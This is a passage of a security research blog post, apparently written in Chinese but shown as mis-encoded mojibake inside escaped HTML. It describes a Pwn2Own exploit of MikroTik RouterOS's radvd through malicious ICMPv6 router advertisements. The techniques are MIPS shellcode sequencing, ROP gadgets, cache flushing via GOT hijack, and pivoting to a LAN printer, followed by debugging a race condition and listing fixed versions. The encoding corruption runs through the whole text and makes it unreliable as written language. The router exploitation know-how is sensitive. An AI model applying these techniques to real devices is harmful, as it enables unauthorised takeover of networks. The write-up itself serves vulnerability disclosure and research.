&lt;p&gt;æœ€ç°¡å–®çš„æ–¹æ³•æ˜¯æŠŠ IPv6 çš„ prefix ç•¶ä½œæµæ°´è™Ÿï¼Œé€™æ¨£å¯ä»¥ä¿è­‰æˆ‘å€‘æ§‹é€ çš„å…§å®¹ç…§é †åºæ’åˆ—ï¼Œæ¥è€…åªè¦é€é ROP gadget è·³åˆ°å¾ŒåŠæ®µçš„ shellcode ä¸Šé¢å°±ç®—å®Œæˆäº†ã€‚è€Œåœ¨æ’°å¯« shellcode æ™‚ï¼Œæˆ‘å€‘åªè¦æŠŠæ¯å€‹åœ°å€çš„ suffix éƒ½æ§‹é€ æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; ï¼Œç”¨ä¾†è·³éç„¡æ³•åŸ·è¡Œçš„æµæ°´è™Ÿå³å¯ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†ç”±æ–¼ MIPS å­˜åœ¨ delay slot æ©Ÿåˆ¶çš„é—œä¿‚ï¼ŒCPU å¯¦éš›ä¸Šæœƒå…ˆå»åŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; æŒ‡ä»¤çš„å¾Œä¸€æ¢æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥æˆ‘å€‘å¿…é ˆæŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; å¾€å‰ç§»å‹•æ‰è¡Œï¼Œä½†ç·Šæ¥è‘—çš„å•é¡Œä¾¿æ˜¯ï¼šåœ¨ delay slot ä¸­ä¸èƒ½ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; é€™å€‹æŒ‡ä»¤ã€‚é€™ç¨®æƒ…å¢ƒä¸‹ï¼Œpayload æ§‹é€ èµ·ä¾†ç›¸ç•¶éº»ç…©ä¹‹å¤–ï¼Œé‚„å¯èƒ½æœƒè¶…éæˆ‘å€‘å¯ä»¥ä½¿ç”¨çš„é•·åº¦ï¼Œå› æ­¤é€™å¾ä¸€é–‹å§‹å°±æ˜¯å€‹å£ä¸»æ„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œçœ¼å°–çš„æœ‹å‹è‚¯å®šå·²ç¶“ç™¼ç¾äº†ï¼Œé€™å…¶å¯¦æ˜¯ CTF ä¸­å¸¸è¦‹çš„åˆå­¸ç­‰ç´šé¡Œç›®ï¼Œåªè¦è®“ prefix æ˜¯ä¸€å€‹åˆæ³•ä¸”ä¸å½±éŸ¿åŸ·è¡Œçµæœçš„æŒ‡ä»¤å°±å¥½äº†ï¼Œæˆ‘å€‘æŠŠ prefix æ”¹æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 3&lt;/code&gt;â€¦â€¦ï¼Œä»¥æ­¤é¡æ¨ã€‚é™¤äº† payload æœƒç…§æ’åºæ’å¥½ä¹‹å¤–ï¼Œä¹Ÿç¯€çœäº†æœ¬ä¾†ç”¨ä¾†æ”¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; æŒ‡ä»¤çš„ç©ºé–“ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†æˆ‘å€‘é‚„éœ€è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ payload æ‰è¡Œï¼Œå› ç‚ºæˆ‘å€‘æ²’æœ‰ leak stack ä½å€çš„æ¼æ´ï¼ŒåŠ ä¸Šæˆ‘å€‘æ‰¾ä¸åˆ°ä»»ä½•å¯ç”¨çš„ gadget ä¾†æŠŠ stack ä½å€å¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$sp&lt;/code&gt; æš«å­˜å™¨æ¬åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t9&lt;/code&gt; æš«å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘å€‘é€™è£¡åšçš„äº‹æƒ…æ˜¯ï¼šé¦–å…ˆï¼Œé€é ROP gadget æŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jalr $sp&lt;/code&gt; æŒ‡ä»¤å¯«åˆ°ä¸€å¡Šè¨˜æ†¶é«”ä¸Šï¼Œä¹‹å¾Œå†ç”¨ä¸€å€‹ ROP gadget è·³ä¸Šå»åŸ·è¡Œå®ƒï¼Œé€™æ¨£å°±å¯ä»¥å°‡åŸ·è¡Œæµç¨‹å°å‘æˆ‘å€‘æ§‹é€ çš„ shellcodeï¼Œè½èµ·ä¾†æ˜¯ä¸€ç‰‡å…‰æ˜çš„æœªä¾†ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†å…‰æ˜¯é€™æ¨£æ˜¯ç„¡æ³•é †åˆ©åŸ·è¡Œ shellcode çš„ï¼Œå› ç‚º MIPS é‡å°è¨˜æ†¶é«”çš„å­˜å–æ–¹å¼æœ‰å…©å€‹ä¸åŒçš„ cacheã€‚&lt;/p&gt;

&lt;h3 id=&quot;cache&quot;&gt;cache&lt;/h3&gt;

&lt;p&gt;MIPS ä¸Šå­˜åœ¨å…©å€‹ cacheï¼šI-cacheï¼ˆinstruction cacheï¼‰ã€D-cacheï¼ˆdata cacheï¼‰ã€‚&lt;/p&gt;

&lt;p&gt;ç•¶æˆ‘å€‘æŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; æŒ‡ä»¤å¯«ä¸Šè¨˜æ†¶é«”æ™‚ï¼Œå¯¦éš›ä¸Šæ˜¯å¯«åˆ° D-cache ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œç•¶æˆ‘å€‘æ¥è‘—æŠŠåŸ·è¡Œæµç¨‹æ§åˆ¶åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; çš„åœ°å€æ™‚ï¼Œè™•ç†å™¨æœƒå…ˆå»æª¢æŸ¥é€™å€‹åœ°å€çš„æŒ‡ä»¤æœ‰æ²’æœ‰åœ¨ I-cache ç•¶ä¸­ï¼Œå› ç‚ºè©²ä½å€ä½æ–¼ data sectionï¼Œåœ¨æ­£å¸¸åŸ·è¡Œæµç¨‹ä¸­è‚¯å®šæ²’æœ‰è¢«åŸ·è¡Œéï¼Œæ‰€ä»¥ cache æ°¸é éƒ½æœƒ missï¼Œå› æ­¤è™•ç†å™¨æœƒæ¥è‘—å°‡ memory çš„å…§å®¹è¼‰å…¥ I-cache ç•¶ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ­¤æ™‚å› ç‚º D-cache çš„å…§å®¹é‚„æ²’æœ‰è¢«æ›´æ–°åˆ° memory ä¸Šï¼ŒI-cache åªæœƒæŠ“åˆ°ä¸€å † null bytesï¼Œä¹Ÿå°±æ˜¯ MIPS ä¸Šçš„ nopï¼Œæ‰€ä»¥ç¨‹å¼åªæœƒåŸ·è¡Œä¸€å †æ¯«ç„¡æ„ç¾©çš„ nop ç›´åˆ° crash ç‚ºæ­¢ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€™è£¡æˆ‘å€‘éœ€è¦ä½¿è™•ç†å™¨å°‡ D-cache çš„å…§å®¹å¯«å› memoryï¼Œæœ‰å…©å€‹æ–¹æ³•å¯ä»¥åšåˆ°é€™ä»¶äº‹æƒ…ï¼šcontext switch æˆ–æ˜¯ç”¨ç›¡ D-cache æ‰€æœ‰ç©ºé–“ï¼ˆ32 KBï¼‰ã€‚è§¸ç™¼ context switch æ˜¯æ¯”è¼ƒç°¡å–®çš„åšæ³•ï¼Œä½†åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¸­ä¸¦æ²’æœ‰ä»»ä½• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep&lt;/code&gt; è®“æˆ‘å€‘ç”¨ä¾†è§¸ç™¼ context switchï¼Œå…¶ä»– function é›–ç„¶ä¹Ÿæœƒé™·é€² kernelï¼Œä½† context switch ç™¼ç”Ÿçš„æ©Ÿç‡ä¸¦ä¸é«˜ï¼Œç‚ºäº†è§’é€ Pwn2Own å† è»ï¼Œè®“æ”»æ“Šé”åˆ°è¶¨è¿‘ 100% æˆåŠŸçš„ç©©å®šåº¦æ˜¯å¿…é ˆçš„ï¼Œå› æ­¤æˆ‘å€‘è½‰è€Œå°‹æ‰¾è€—ç›¡ D-cache çš„ 32kb å®¹é‡çš„æ–¹æ³•ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆï¼Œé€éç°¡å–®çš„æª¢æŸ¥å¯ä»¥ç™¼ç¾ RouterOS çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radomize_va_space&lt;/code&gt; è®Šæ•¸æ˜¯ 1ï¼Œè¡¨ç¤º heap çš„è¨˜æ†¶é«”ä½å€ä¸æ˜¯éš¨æ©Ÿçš„ï¼Œå› æ­¤ä¸éœ€è¦ leak å°±å¯ä»¥çŸ¥é“ heap æ‰€åœ¨ä½å€ï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦æ¥è‘—æƒ³è¾¦æ³•è®“ heap åˆ†é…è¶³å¤ å¤§çš„ç©ºé–“ï¼Œç„¶å¾Œå¯«ä¸€äº›ç„¡é—œç·Šè¦çš„æ±è¥¿ä¸Šå»å°±å¯ä»¥è€—ç›¡ 32kb çš„ D-cache äº†ï¼ä¸é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¸­ä¸¦æ²’æœ‰å¤ªå¤šå¥½ç”¨çš„ ROP gadgetï¼Œæ‰€ä»¥è¦æ§‹é€ é€™æ¨£çš„ payload éœ€è¦ä¸²é€£æ›´å¤š ROP gadget æ‰èƒ½é”åˆ°åŒæ¨£çš„ç›®çš„ï¼Œæœ€çµ‚ payload é•·åº¦å¯èƒ½æœƒè¶…éæˆ‘å€‘å¯ä»¥è¦†è“‹çš„é•·åº¦ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¹¸é‹çš„æ˜¯å¦‚åŒå‰é¢æ‰€èªªï¼ŒDNS è¢«å­˜æ”¾åœ¨ tree çµæ§‹ä¸­ï¼Œæ‰€ä»¥å„²å­˜æ™‚å°±å·²ç¶“åœ¨ heap ä¸­ä½”æ“šä¸€å¤§å¡Šè¨˜æ†¶é«”ï¼Œé€é gdb é€æ­¥åŸ·è¡Œï¼Œæˆ‘å€‘å¯ä»¥ç¢ºå®šåœ¨è™•ç† DNS æ™‚ï¼Œheap çš„ç©ºé–“å·²ç¶“æ¯” 32kb é‚„è¦å¤§ï¼å› æ­¤æˆ‘å€‘åªè¦æ¥è‘—é€é GOT hijack å‘¼å« memcpy å¾€ heap å¯« 32kb çš„åƒåœ¾å°±å¯ä»¥äº†ï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘çš„ exploit å°±å®Œæˆäº†ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;çµåˆæˆ‘å€‘å¦å¤–ä¸€å€‹ç‚ºäº† Pwn2Own æ‰¾çš„ Canon printer å¼±é»ï¼Œæ”»æ“Šæµç¨‹æœƒæ˜¯&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ”»æ“Šè€…ä½œç‚º router çš„å£é„°å±…ï¼Œå°å®ƒç™¼é€æƒ¡æ„çš„ ICMPv6 å°åŒ…&lt;/li&gt;
  &lt;li&gt;åœ¨æˆåŠŸæ§åˆ¶ router å¾Œï¼Œæˆ‘å€‘é€²è¡Œ port forwardingï¼ŒæŠŠ payload å°å‘åœ¨ LAN çš„ Canon å°è¡¨æ©Ÿã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Pwn2Own çš„æ¯”è³½ç’°å¢ƒä¸­ï¼Œç¶²è·¯ç’°å¢ƒå¯ä»¥è¢«ç°¡åŒ–å¾—æ›´ç°¡å–®ä¸€é»ï¼Œå¦‚ä¸‹ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploit-é™¤éŒ¯éç¨‹&quot;&gt;Exploit é™¤éŒ¯éç¨‹&lt;/h2&gt;

&lt;p&gt;å°±åœ¨æˆ‘å€‘è¦ºå¾— $100,000 çš„çé‡‘å·²ç¶“åˆ°æ‰‹çš„æ™‚å€™ï¼Œä¸å¯æ€è­°çš„äº‹æƒ…ç™¼ç”Ÿäº†ï¼Œé‚£å°±æ˜¯æˆ‘å€‘çš„æ”»æ“Šåªè¦åœ¨ Ubuntu ä¸ŠåŸ·è¡Œå°±æœƒå¤±æ•—ï¼Œä¸ç®¡é€™å€‹ Ubuntu ç³»çµ±æ˜¯åœ¨ MacOS å…§çš„ä¸€å°è™›æ“¬æ©Ÿå™¨åˆæˆ–è€…æ˜¯ä¸€å° Ubuntu å¯¦æ©Ÿï¼›è€Œ Pwn2Own å®˜æ–¹ï¼ŒåŸºæœ¬ä¸Šæ˜¯ä½¿ç”¨ Ubuntu ä¾†åŸ·è¡Œæˆ‘å€‘çš„ exploitï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆè¦è§£æ±ºé€™å€‹å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å˜—è©¦åœ¨ MacOS ä¸ŠåŸ·è¡Œ exploit ä¸¦ä¸”ç´€éŒ„ç¶²è·¯å°åŒ…ï¼Œç„¶å¾Œåœ¨ Ubuntu ä¸Šé‡æ”¾æµé‡ï¼Œå¯ä»¥è§€å¯Ÿåˆ°é‡æ”¾æœƒå¤±æ•—ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿå˜—è©¦åœ¨ Ubuntu ä¸ŠåŸ·è¡Œ exploit ä¸¦ä¸”è¨˜éŒ„ç¶²è·¯å°åŒ…ï¼Œç•¶ç„¶åœ¨ Ubuntu ä¸Šæ˜¯å¤±æ•—çš„ï¼Œä½†ç•¶æˆ‘å€‘åœ¨ MacOS é‡æ”¾å¤±æ•—çš„æµé‡æ™‚ï¼Œä»–ç«Ÿç„¶æˆåŠŸäº†ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åˆ°é€™è£¡æˆ‘å€‘çŒœæ¸¬å¯èƒ½æ˜¯å…¶ä¸­ä¸€å€‹ OS åœ¨é€å‡ºå°åŒ…ä¹‹å‰æœƒå°å°åŒ…é€²è¡Œé‡æ–°æ’åºï¼Œè€Œé‡æ–°æ’åºçš„é€™å€‹è¡Œç‚ºæˆ–è¨±åœ¨ wireshark æ“·å–åˆ°å°åŒ…ä¹‹å¾Œï¼Œæ‰€ä»¥æ‰æ²’è¢« wireshark ç´€éŒ„åˆ°ã€‚å› æ­¤æˆ‘å€‘ç›´æ¥å¯«äº†ä¸€å€‹ sniffer æ”¾åœ¨ router ä¸Šé¢ä¾†ç›£æ§æµé‡ï¼Œä¸”å› ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_PACKET&lt;/code&gt; é¡å‹çš„ socket ä¸æœƒè¢«é˜²ç«ç‰†è¦å‰‡å½±éŸ¿ï¼Œçµæœæ‡‰è©²è¦éå¸¸å¯é ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œå¾å…©é‚ŠéŒ„åˆ°çš„å°åŒ…æ ¹æœ¬&lt;strong&gt;ä¸€æ¨¡ä¸€æ¨£&lt;/strong&gt;â€¦â€¦&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ï¼Œexploit ç›®å‰åªåœ¨æˆ‘çš„ MacOS ä¸ŠæˆåŠŸéï¼Œå¦‚æœç‹€æ³ä¸è§£æ±ºï¼Œå”¯ä¸€çš„æ–¹æ³•å°±æ˜¯æˆ‘å¸¶è‘—æˆ‘çš„ Mac ç­†é›»é£›å»å¤šå€«å¤šï¼Œåœ¨ç¾å ´ç”¨æˆ‘è‡ªå·±çš„ç­†é›»é€²è¡Œæ”»æ“Šã€‚ä½†æˆ‘å€‘ä¸å¯èƒ½æ”¾è‘—é€™å€‹æˆå› ä¸æ˜çš„å•é¡Œä¸ç®¡ï¼Œèª°çŸ¥é“æœƒä¸æœƒåœ¨æ¯”è³½ä¸­ä¹Ÿç™¼ç”Ÿåœ¨æˆ‘çš„ç­†é›»ä¸Šï¼Œå¦‚æœçœŸçš„ç™¼ç”Ÿé‚£å°±è™§å¤§äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ç¶“éå¹¾æ¬¡è¬¹æ…çš„å¾©ç›¤ä¹‹å¾Œæˆ‘å€‘çµ‚æ–¼çŸ¥é“å•é¡Œçš„æˆå› äº†â€”â€”é€Ÿåº¦ã€‚å› ç‚ºå…©å€‹ RA å°åŒ…é€å‡ºæ™‚é–“é–“éš”ä¸¦ä¸å¤§ï¼Œæ‰€ä»¥å¾ˆé›£åœ¨ wireshark çš„æ™‚é–“è»¸ä¸Šç›´æ¥çœ‹å‡ºä¾†ï¼Œä½†å¦‚æœè¨ˆç®—ä¸€ä¸‹æœƒç™¼ç¾ï¼Œå…©å€‹æ‰€èŠ±è²»çš„æ™‚é–“å…¶å¯¦&lt;strong&gt;ç›¸å·®äº† 390 å€&lt;/strong&gt;ã€‚æ‰€ä»¥å•é¡Œä¹Ÿä¸æ˜¯å‡ºåœ¨ Ubuntu ä¸Šï¼Œè€Œæ˜¯å› ç‚º Mac é€å…©å€‹å°åŒ…é€çš„å¤ªå¿«ï¼Œä¸å°å¿ƒè§¸ç™¼äº†å­˜åœ¨åœ¨ radvd ä¸­çš„ race conditionï¼ˆåŠ ä¸Šæ¥µåº¦æ‡¶æƒ°çš„æˆ‘æ²’æœ‰å¥½å¥½è¨ˆç®—è“‹åˆ° return address è¦èŠ±å¤šå°‘ bytesï¼Œç›´æ¥åœ¨ä¸Šé¢å¯«æ»¿åƒåœ¾ç„¶å¾Œåš pattern match è€Œå·²ï¼Œæ‰€ä»¥é€™å€‹ offset åªåœ¨ race çš„æƒ…æ³ä¸‹æ‰æ­£ç¢ºï¼‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ³•å°±æ˜¯åœ¨é€å‡ºå…©å€‹ RA å°åŒ…ä¹‹é–“ sleep ä¸€ä¸‹ï¼Œä¸¦æŠŠ payload ä¸­çš„ offset ä¿®å¾©æˆæ²’æœ‰ race çš„æƒ…æ³ä¸‹è§€å¯Ÿåˆ°çš„ offsetï¼Œå°±å¯ä»¥ç©©å®šæˆ‘å€‘çš„æ”»æ“Šè…³æœ¬ï¼ŒæŠŠæˆåŠŸæ©Ÿç‡æå‡åˆ° 100%ã€‚&lt;/p&gt;

&lt;h3 id=&quot;fix&quot;&gt;Fix&lt;/h3&gt;

&lt;p&gt;é€™å€‹æ¼æ´åœ¨ä»¥ä¸‹ç‰ˆæœ¬ä¸­å·²ç¶“è¢«ä¿®å¾©ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8, 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åŒæ™‚æˆ‘å€‘ä¹Ÿç™¼ç¾é€™å€‹æ¼æ´å¾ RouterOS v6.0 å°±å·²ç¶“å­˜åœ¨äº†ï¼Œå¾å®˜ç¶²å¯ä»¥ç™¼ç¾ 6.0 çš„ç™¼å¸ƒæ—¥æœŸæ˜¯ 2013-05-20ï¼Œä¹Ÿå°±æ˜¯èªªé€™å€‹æ¼æ´å·²ç¶“å­˜åœ¨åœ¨é‚£è£¡&lt;strong&gt;ä¹å¹´ä¹‹ä¹…&lt;/strong&gt;ï¼Œå»æ²’æœ‰äººç™¼ç¾ä»–ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å‘¼æ‡‰åˆ°æˆ‘å€‘ä¸€é–‹å§‹çš„æƒ³æ³•ï¼šã€Œæ²’æœ‰ä»»ä½•ç†æ™ºæ­£å¸¸çš„äººæƒ³è¦èŠ±æ™‚é–“é€†å‘ nova binaryã€ï¼Œå¾—è­‰ã€‚&lt;/p&gt;

&lt;h2 id=&quot;the-race-condition&quot;&gt;The race condition&lt;/h2&gt;

&lt;p&gt;ç„¶è€Œé€™å€‹å¦¨ç¤™æˆ‘å€‘è¼•é¬†è³ºå– $100,000 çš„ race condition æ˜¯æ€éº¼ç™¼ç”Ÿçš„ï¼Ÿå¦‚å‰é¢æ‰€è¿°ï¼Œnova binary ä¸­æœ‰ä¸€å€‹ Looper å¾ªç’°æª¢æŸ¥ç•¶å‰æœ‰ä»€éº¼äº‹ä»¶ç™¼ç”Ÿï¼Œä¹Ÿå°±æ˜¯èª¬é€™æ˜¯ä¸€å€‹ single thread çš„ç¨‹å¼ï¼Œé‚£ race condition æ˜¯æ€éº¼å›äº‹ï¼Ÿï¼ˆæœ‰äº› nova binary æ˜¯ multi-fiberï¼Œä½† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¸¦ä¸æ˜¯ï¼‰&lt;/p&gt;

&lt;p&gt;é€™å°±è¦æåˆ°ä¸€å€‹å‰›æ‰æ²’æœ‰æåˆ°çš„ç´°ç¯€ï¼Œç•¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; åœ¨è§£æå¾ WAN æ”¶åˆ°çš„ RA å°åŒ…æ™‚ï¼ŒDNS æ˜¯è¢«å­˜å…¥ä¸€å€‹ ã€Œvectorã€ ç•¶ä¸­ï¼Œç„¶è€Œåœ¨æº–å‚™ LAN å»£æ’­ç”¨çš„ RA å°åŒ…æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; å»æ˜¯æŠŠä¸€å€‹å„²å­˜äº† DNS çš„ ã€Œtreeã€çµ¦å±•é–‹ï¼Œæ‰€ä»¥é€™å€‹ vector è·Ÿ tree ä¹‹é–“æ˜¯ä»€éº¼é—œä¿‚ï¼Ÿåˆæ˜¯æ€éº¼è½‰æ›éå»çš„ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘æ²’æœ‰ç¬¬ä¸€æ™‚é–“å°±åœ¨ callback è£¡é¢æ‰¾åˆ°ã€Œå¾ WAN æ”¶åˆ° RA å°±æœƒå¾€ LAN å»£æ’­ RA å°åŒ…ã€çš„é‚è¼¯ï¼Œå› ç‚ºé€™æ˜¯ç”±å…©å€‹ process åœ¨ä¸€é™£è¤‡é›œçš„äº’å‹•ä¹‹å¾Œæ‰€ç”¢ç”Ÿçš„çµæœã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä»”ç´°çœ‹ä¸€ä¸‹ callback å…·é«”ä¸Šåšäº†ä»€éº¼ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€å€‹ array è² è²¬ç”¨ä¾†å­˜æ”¾ä¸€ç¨®å«åšã€Œ remote objectã€çš„ç‰©ä»¶ï¼Œé€™æ®µç¨‹å¼ç¢¼çœ‹èµ·ä¾†å¾ˆç›´è§€ï¼Œå°±æ˜¯è¿­ä»£å­˜æœ‰ DNS çš„ vectorï¼Œç„¶å¾Œç‚ºæ¯å€‹ DNS åœ°å€éƒ½å‘¼å«ä¸€æ¬¡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::roDNS&lt;/code&gt;ï¼Œä¸¦æŠŠå‡½å¼çš„åŸ·è¡Œçµæœä¿å­˜åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS_remoteObject&lt;/code&gt; vector ç•¶ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-object&quot;&gt;remote object&lt;/h3&gt;

&lt;p&gt;æ‰€ä»¥ä»€éº¼æ˜¯ remote objectï¼Ÿremote object æ˜¯ RouterOS ä¸­ç”¨ä¾†è·¨ process åˆ†äº«è³‡æºçš„ä¸€å€‹æ©Ÿåˆ¶ï¼šä¸€å€‹ process è² è²¬ä¿å­˜å…±ç”¨è³‡æºï¼Œç„¶å¾Œå¦å¤–ä¸€å€‹ prcoess å¯ä»¥é€šé id å‘è² è²¬ä¿å­˜çš„ process ç™¼é€è«‹æ±‚ä¾†é€²è¡Œå¢åˆªæŸ¥æ”¹ã€‚ ä¾‹å¦‚ DNS remote object å¯¦éš›ä¸Šæ”¾åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; process ä¸­çš„ handler 2ï¼Œè€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; çš„ handler 1 åªæ˜¯å–®ç´”ä¿æœ‰é€™äº›ç‰©ä»¶å°æ‡‰çš„ id è€Œå·²ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;subscription-and-notification&quot;&gt;subscription and notification&lt;/h3&gt;

&lt;p&gt;ç•¶ä¸€å€‹ remote object è¢«æ›´æ–°æ™‚ï¼Œæœ‰äº› process å¯èƒ½æœƒæƒ³è¦åšå‡ºå°æ‡‰çš„è¡Œç‚ºï¼Œæ‰€ä»¥ nova binary å¯ä»¥é€é IPC äº‹å…ˆè¨‚é–±å…¶ä»– nova binary ä¸­çš„ remote objectã€‚ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ç‚ºä¾‹ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ä¸­çš„ handler 1  è² è²¬ç®¡ç† ipv6 address poolï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dchp&lt;/code&gt; process æœƒå»è¨‚é–± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; çš„ handler 1ï¼Œæ‰€ä»¥ç•¶ ipv6 address pool æœ‰ç•°å‹•æ™‚ï¼Œdhcp å¯ä»¥æª¢æŸ¥éœ€ä¸éœ€è¦é‡å°é€™äº›ç•°å‹•é€²è¡Œé€²ä¸€æ­¥çš„è™•ç†ï¼Œä¾‹å¦‚é—œé–‰æŸå€‹ dhcp serverã€‚&lt;/p&gt;

